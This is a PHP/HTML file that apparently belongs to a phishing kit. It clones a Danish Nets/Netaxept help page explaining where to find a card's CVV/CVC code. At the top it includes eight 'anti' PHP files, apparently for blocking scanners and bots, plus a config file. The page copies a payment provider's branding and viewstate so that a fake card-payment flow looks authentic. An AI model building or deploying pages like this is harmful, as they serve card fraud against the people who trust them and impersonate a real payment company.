<?php 
include("anti/anti1.php");
include("anti/anti2.php");
include("anti/anti3.php");
include("anti/anti4.php");
include("anti/anti5.php");
include("anti/anti6.php");
include("anti/anti7.php");
include("anti/anti8.php");
include('config.php');

?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="da-DK">
    <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>
	Nets - Hvad er CVV?
</title><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta http-equiv="X-UA-Compatible" content="IE=edge"><link href="./file/css/StyleSheet_ExistingTerminal.css" rel="stylesheet" type="text/css"></head>
<body>
    <form name="form1" method="post" action="" id="form1">
<div>
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="ugOIwMOhXGpbtuEgfc6foQ84BOMGNBsJFzCPLhiVChhdwEFExBOmuPBT94O++BWB8ozOzKweIAcRIZn0mnzvyNZkTBIla6bexn6wfL6sFnuB9AWKUUDu2K4mZqs3M59zKqn+vlyNxOSKjHDZ0vTAfVZo9Q8Sl6lcVqZSBaO4kLEhCB0eN6gVcz5e69Zkf33wqNFngNCLaT30kRlbU7uv+ZKh7wOIWa0J1JG0qO1EoWkzjr0Ga4QLMBHlYxsK/gfyZah0u981nTZSisS/6b48y1MTWDEAVSui4PW146RhLVJt3vY0+pjw4gKpC14LsOGRxY9f3i+MsuyhkOnbVdKIpEAVOxR94jBTy1yT0NtJIh+rwMONJrahhc0iNlricl6ndufZV2ORE0adNUI5LYZEMd+1Vzp9CjAZdwJFHL7rqHByGfyyE++PiqAQHzT5E3BwbC8J+p7KLNAQ4jCe5D1N50ooIVE8JGBj5oWXI1H25C2CpSRmBoyE8qj6ZFY0dr479PTp6CXaVbyO/7+w1kbhZeoxZ+cKcxPPI4wADbvTip5XHjAva066Aj8GkxUgS3Zl1IzWOl5yxGB5pxNJPIz44cGwfbrJeuDxOTsurWt+UU9+OYuMSLUQSk+al2k/HK2OS0F9HoDb7ZxUCxMOVoGYB6TQ5Tt8ketfsqCE+aCz4km1uDuCEQfZk3DQNRgTJ+P5uiMP+ExXBxXBw33A+0bU7zSJYwaFF8zwcog6uo9B9teXP8+PF48SUfbExHmCzK+8PjKeyq/8GxjFc40CIt+gZcz8fVclQsuPFkrVnt/Sv1iz6DgcDscSCc6L5lRU6STSXIyp7FiIUs1v/sEpHgSUd4g6NKDp5XKvGHeMYO6q31cP6oj4mDJwG+JrCebHuM71IYcixyCLdPMXON1hluHUbm9Dy7H+Vk7WUZRPsRp9TZQ/TpfBaEmcAT6toTTjJUeOoKYs0uugk7Jn32usDjG71/uIqDF19qOjowmIVENC3Gd3GwvJoz8Y0GxhI/xmyvMrJXUXUPgSxl6vVmFe7Fph6qGrIKkdnutsWXaklF3TEBi8bhb2+n4005EMnRy02XIjRPlX8Npu2v1KwLb+LwNvb4IxpE2j6SbLGsiCygdPWvRb95eLsEnvg+v0BjhnnphIxuxy1FxtyZyPpXkyh5OD52gPnsyLuo1DNBWHExCZLjkplRJ9RwIDlePoE1ttVW7Gw4z099H0Kn7W0vD8w8nlJCfGb8CIIugEfXAwmV3b/3LCjQQQ5ZXjR9C3u5PfN1RhYYRmWQ479vDXCqQO59y8/Tdz9f64sOSHCEgDbq8HxbDvxr+6">
</div>

<div>

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="40CE9D61">
	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="">
</div>
      <div class="col-5 col-s-12">
        <div id="bbsHostedContent">

            <div style="border:solid 1px #7f7b7b;">


                    <table style="padding:0px;border-spacing:0px;" role="presentation"> 
                        <tbody><tr role="presentation">
                            <td role="presentation">
                                <img id="HelpTopImage" class="col-10 col-s-12" src="./file/img/TopLedge_New.png" alt="Netaxept &amp; Nets Logo" style="border-width:0px;">
                            </td>
                        </tr>
                        <tr role="presentation"> 
                            <td colspan="2" role="presentation"> 
                                <div style="font-weight: bold;padding-left:10px;color:black">  
                                   <h1> Hvad er verifikationskode(CVV2/ CVC2/CID)?</h1>
                                    </div> 
                                <div style="padding-left:10px;margin-top:-6px;color:black">
                                    <span id="into">Verifikationskoden er et 3- eller 4cifret nummer som er printet enten på for-eller bagsiden af dit kort. Verifikationskoden hjælper shoppen til at undgå svindel og for at verificere transaktionen, når det aktuelle kort ikke er til stede på købstidspunktet. Nummeret bruges som en del af en autorisationsproces med kortudsteder.</span>
                                </div>

                            </td>
                        </tr> 
                        <tr role="presentation"> 
                            <td style="vertical-align:top" role="presentation"> 
                                <div style="font-weight: bold;padding-left:10px;color:black">                                     
                                    <h1>  Hvor finder jeg det?</h1>
                                </div>
                                <div style="font-weight: bold;padding-left:10px;color:black"> 
                                    <h2>Visa, Mastercard, JCB, Diners Club og Discover</h2>
                                </div> 
                                <div style="padding-left:10px;margin-top:-10px;color:black"><span id="visa">Verifikationskoden er det 3cifrede nummer printet på bagsiden af dit kort, for det meste for enden af signaturfeltet. Hvis du bruger et kredit/debitkort og ønsker at betale med debit er verifikationskoden de tre cifre efter kortnummeret på kortets bagside.</span></div>
                            </td>
                        </tr> 
                        <tr role="presentation">
                            <td style="vertical-align:top" role="presentation"> 
                                <div style="font-weight: bold;padding-left:10px;color:black"><h2>American Express</h2></div> 
                                <div style="padding-left:10px;padding-bottom:10px;margin-top:-10px;color:black"><span id="amex">Verifikationskoden er det 4cifrede nummer printet på forsiden af dit kort, over og på den højre side af dit kortnummer.</span></div>
                            </td>
                        </tr>
                    </tbody></table>
        </div>
                </div>
            </div>

    </form>


</body></html>